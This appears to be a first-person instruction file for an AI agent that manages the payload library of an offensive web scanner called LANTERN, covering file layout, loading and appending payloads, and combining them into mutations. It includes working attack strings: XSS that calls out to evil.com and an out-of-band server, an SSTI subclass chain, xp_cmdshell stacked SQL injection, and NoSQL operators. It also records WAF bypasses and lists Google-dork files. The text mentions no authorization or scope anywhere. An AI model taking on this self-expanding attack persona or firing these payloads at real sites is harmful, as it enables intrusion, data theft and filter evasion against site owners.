# LANTERN Payload Library

I have direct access to LANTERN's payload files. I can READ from them,
WRITE new payloads to them, and COMBINE payloads across files for mutation.

---

## Payload Directory Location

Relative to LANTERN root:
```
payloads/
```

Full path (auto-detected at runtime based on LANTERN installation).

---

## Payload File Structure

### Injection Payloads

| File | Contents | Lines |
|------|----------|-------|
| `sqli.txt` | Basic SQL injection | ~50 |
| `sqli_advanced.txt` | Complex/WAF bypass SQLi | ~100 |
| `xss.txt` | Basic XSS vectors | ~115 |
| `xss_advanced.txt` | Filter bypass XSS | ~100 |
| `xss_master.txt` | Complete XSS arsenal | ~150 |
| `lfi.txt` | Path traversal payloads | ~80 |
| `ssti.txt` | Template injection | ~100 |
| `ssrf.txt` | SSRF payloads | ~90 |
| `cmdi.txt` | Command injection | ~30 |
| `xxe.txt` | XXE payloads | ~80 |
| `crlf.txt` | Header injection | ~40 |

### Other Payloads

| File | Contents |
|------|----------|
| `redirect.txt` | Open redirect payloads |
| `smuggle.txt` | HTTP smuggling |
| `headers_bypass.txt` | Header-based WAF bypass |
| `paths.txt` | Common sensitive paths |

### Dorks (Google Dorking)

```
payloads/dorks/
├── admin_login.txt      ← Admin panel dorks
├── backups.txt          ← Backup file dorks
├── cms_vulns.txt        ← CMS vulnerability dorks
├── database_files.txt   ← Database exposure dorks
├── error_pages.txt      ← Error page dorks
└── sensitive_files.txt  ← Sensitive file dorks
```

### Learned Payloads (Auto-Generated)

```
payloads/learned/
├── index.json     ← Master index with metadata
├── xss.txt        ← Learned XSS payloads
├── sqli.txt       ← Learned SQLi payloads
├── lfi.txt        ← Learned LFI payloads
└── ...            ← Other categories
```

---

## Reading Payloads

### Load All Payloads for a Category

```python
from pathlib import Path

def load_payloads(category):
    payload_dir = Path("payloads")
    payload_file = payload_dir / f"{category}.txt"
    
    if payload_file.exists():
        return payload_file.read_text().strip().split("\n")
    return []

xss_payloads = load_payloads("xss")
sqli_payloads = load_payloads("sqli")
```

### Load with Learned Payloads First

```python
from core.learned import load_payloads_with_learned

payloads = load_payloads_with_learned("xss")
```

---

## Writing New Payloads

### When I Discover a Working Payload

If I find a payload that works but isn't in the file, I APPEND it:

```python
def add_payload_to_file(category, new_payload):
    payload_dir = Path("payloads")
    payload_file = payload_dir / f"{category}.txt"
    
    existing = payload_file.read_text() if payload_file.exists() else ""
    
    if new_payload not in existing:
        with open(payload_file, "a") as f:
            f.write(f"\n{new_payload}")
        return True
    return False

add_payload_to_file("xss", "<svg/onload=fetch('//evil.com')>")
```

### Recording to Learned Payloads

For payloads discovered during scans (with context):

```python
from core.learned import record_successful_payload

record_successful_payload("xss", "<svg/onload=alert(1)>", {
    "target": "https://target.com",
    "waf": "Cloudflare",
    "context": "bypassed_filter"
})
```

---

## Combining Payloads for Mutation

### Cross-File Combination

I can take parts from different payload files to create new ones:

```python
def create_hybrid_payload():
    xss_tags = ["<script>", "<svg", "<img", "<body"]
    xss_events = ["onerror=", "onload=", "onfocus="]
    xss_actions = ["alert(1)", "fetch('//oob.server')", "eval(atob('...'))"]
    
    sqli_wrappers = ["'/**/", "' OR ", "';--"]
    
    lfi_traversals = ["../", "....//", "%2e%2e%2f"]
    
    for tag in xss_tags:
        for event in xss_events:
            for action in xss_actions:
                yield f"{tag} {event}{action}>"
```

### Example: Combining SSTI + XSS

From `ssti.txt`:
```
{{7*7}}
{{config}}
```

From `xss.txt`:
```
<script>alert(1)</script>
```

Combined mutation:
```
{{''.__class__.__mro__[2].__subclasses__()[40]('<script>alert(1)</script>')}}
```

### Example: Combining SQLi + CMDI

From `sqli.txt`:
```
' OR '1'='1
```

From `cmdi.txt`:
```
; id
| whoami
```

Combined mutation (stacked injection):
```
'; EXEC xp_cmdshell('whoami');--
```

---

## Payload File Format

Each payload file is simple text, one payload per line:

```
payload1
payload2
payload3
```

No headers, no comments, just raw payloads.

---

## My Payload Management Process

### During a Scan

```
1. Load base payloads: xss.txt (115 payloads)
2. Load learned payloads: learned/xss.txt (prioritized)
3. Try payloads in order
4. If blocked, mutate using techniques from payload_mutation.md
5. If mutation works, record it
```

### After Finding New Payload

```
1. Verify it's not already in the file
2. Add to payloads/{category}.txt for permanent storage
3. Record to learned/ with context for smart prioritization
4. Log the discovery
```

### Example: Full Discovery Flow

```python
original_payload = "<script>alert(1)</script>"

mutation = "<svg/onload=alert(1)>"
result = test_payload(target, mutation)

if result.success and mutation not in load_payloads("xss"):
    add_payload_to_file("xss", mutation)
    
    record_successful_payload("xss", mutation, {
        "original": original_payload,
        "mutation_type": "tag_change",
        "target": target,
        "waf_bypassed": "Cloudflare"
    })
    
    print(f"[+] New payload discovered and saved: {mutation}")
```

---

## Payload Categories I Manage

| Category | Base File | Advanced File | Learned File |
|----------|-----------|---------------|--------------|
| XSS | xss.txt | xss_advanced.txt, xss_master.txt | learned/xss.txt |
| SQLi | sqli.txt | sqli_advanced.txt | learned/sqli.txt |
| LFI | lfi.txt | - | learned/lfi.txt |
| SSTI | ssti.txt | - | learned/ssti.txt |
| SSRF | ssrf.txt | - | learned/ssrf.txt |
| CMDI | cmdi.txt | - | learned/cmdi.txt |
| XXE | xxe.txt | - | learned/xxe.txt |
| CRLF | crlf.txt | - | learned/crlf.txt |
| Redirect | redirect.txt | - | learned/redirect.txt |

---

## Creating New Payload Files

If I discover a new vulnerability class, I can create new payload files:

```python
def create_new_payload_category(category, initial_payloads):
    payload_dir = Path("payloads")
    new_file = payload_dir / f"{category}.txt"
    
    new_file.write_text("\n".join(initial_payloads))
    
    learned_file = payload_dir / "learned" / f"{category}.txt"
    learned_file.touch()
    
    return str(new_file)

create_new_payload_category("nosql", [
    '{"$gt": ""}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
])
```

---

## Payload Quality Rules

When adding payloads, I follow these rules:

1. **No duplicates** - Check before adding
2. **Test first** - Only add verified working payloads
3. **One per line** - Simple format
4. **No comments** - Pure payloads only
5. **Context in learned/** - Metadata goes in learned/index.json

---

## Summary: My Payload Capabilities

✅ **Read** from any payload file
✅ **Write/Append** new payloads when discovered
✅ **Combine** payloads across files for mutation
✅ **Create** new payload categories
✅ **Prioritize** learned payloads over static
✅ **Track** context (WAF bypass, target, tech) in learned/

The payload library is not static - it grows with every scan I perform.
